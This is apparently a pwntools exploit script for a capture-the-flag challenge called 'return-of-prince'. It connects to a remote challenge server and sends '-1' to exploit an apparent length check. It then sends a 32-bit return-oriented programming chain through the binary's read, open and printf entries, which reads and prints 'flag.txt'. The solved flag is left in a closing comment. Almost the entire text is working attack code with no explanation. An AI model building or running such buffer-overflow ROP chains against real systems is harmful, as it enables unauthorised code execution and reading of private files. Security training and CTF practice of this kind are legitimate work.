from pwn import *
elf = context.binary = ELF("./return-of-prince")
read_plt = elf.plt['read']
open_plt = elf.plt['open']
puts_plt = elf.plt['puts']
printf_plt = elf.plt['printf']
exit_plt = elf.plt['exit']
#p = process()
p = remote("45.122.249.68", 20006)
script = """
b*0x0804934A
c
"""
#gdb.attach(p,script)
p.recv()
p.sendline(b'-1')
time.sleep(0.2)
print(p.recv())
payload = cyclic(46-4)+p32(0x0804c030)+p32(read_plt)+p32(0x0804901f)+p32(0)+p32(0x0804c030)+p32(0x1000)+p32(open_plt)+p32(0x0804901f)+p32(0x0804c030)+p32(0)+p32(0)+p32(read_plt)+p32(0x0804901f)
payload += p32(3)+p32(0x0804c030) + p32(0x1000) + p32(printf_plt) +p32(0x0804901f) +p32(0x0804c030)+ p32(exit_plt)
p.send(payload)
time.sleep(0.2)
p.sendline(b'flag.txt\x00')
p.interactive()
#W1{0h-1_d1dn't_s33_h0w_y0u_c4n_r3turn_4nd_b3c0m3_4_n3w_k1ng!!!!!!!!}